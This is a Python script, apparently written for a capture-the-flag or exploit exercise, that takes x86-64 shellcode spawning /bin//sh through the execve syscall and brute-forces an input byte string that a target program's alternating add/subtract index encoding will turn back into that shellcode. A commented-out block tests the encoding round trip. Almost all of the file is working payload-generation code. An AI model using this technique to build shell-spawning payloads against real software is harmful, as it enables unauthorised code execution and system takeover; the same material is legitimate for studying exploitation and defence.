

'''
def decrypt(encode):
	shellcode = ""
	for i in range(len(encode)):
		if(ord(encode[i]) %2 == 0  and i%2 == 0 ):
			shellcode += chr(ord(encode[i]) + i)
		elif(ord(encode[i]) %2 == 0  and i%2 == 1 ):
			shellcode += chr(ord(encode[i]) - i)
		elif(ord(encode[i]) %2 == 1  and i%2 == 0 ):
			shellcode += chr(ord(encode[i]) - i)
		elif(ord(encode[i]) %2 == 1  and i%2 == 1 ):
			shellcode += chr(ord(encode[i]) + i)
		
	return shellcode


def printhex(str):
	result = ""
	for i in str:
		result +=  "\\x" + hex(ord(i))[2:].zfill(2)
	return result

shellcode = "\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\xB0\x3B\x0F\x05"
eshellcode = encrypt(shellcode)

ori = decrypt(eshellcode)
if(ori == shellcode):
	print("Matched")
	print("Ori   : " + printhex(shellcode))
	print("Encode: " + printhex(eshellcode))
else:
	print("NOT Matched")
'''


def encrypt(shellcode):
	output = ""
	for i in range(len(shellcode)):
		if(i & 1 == 1):
			v6 = -1
		else:
			v6 = 1
		mul = v6*i
		output += chr(mul+ord(shellcode[i]))
	return output

def encrypt2(c, index):
	if(index & 1 == 1):
		v6 = -1
	else:
		v6 = 1
	mul = v6*index

	check = mul+ord(c)
	if(check <= 0 or check > 255):
		return -1
	return chr(check)


def genpayload(shellcode):
	output = ""
	for i in range(len(shellcode)):
		tmp = output
		for j in range(20, 230):
			tmp += chr(j)
			if(encrypt(tmp) == shellcode[:i+1]):
				output += chr(j)
				break
			else:
				tmp = output
	return output

def genpayload2(shellcode):
	output = ""
	for i in range(len(shellcode)):
		tmp = output
		for j in range(0, 256):
			if(j == 255):
				output += "\x00"
				break
			check = encrypt2(chr(j), i)
			if(check == -1):
				continue
			if(encrypt2(chr(j), i) == shellcode[i]):
				output += chr(j)
				break
			
			
	return output






def printhex(str):
	result = ""
	for i in str:
		result +=  "\\x" + hex(ord(i))[2:].zfill(2)
	return result

shellcode = "\x80\x77\x1D\x67\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\x48\x89\xC6\x48\x31\xD2\xB0\x3B\x68\x90\x05"
shellcode = "\x48\x31\xC0\x50\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\x48\x89\xC6\x48\x31\xD2\xB0\x3B\x0F\x05"

print(printhex(shellcode))
result = genpayload2(shellcode)

print(printhex(result))

back = encrypt(result)
print(printhex(back))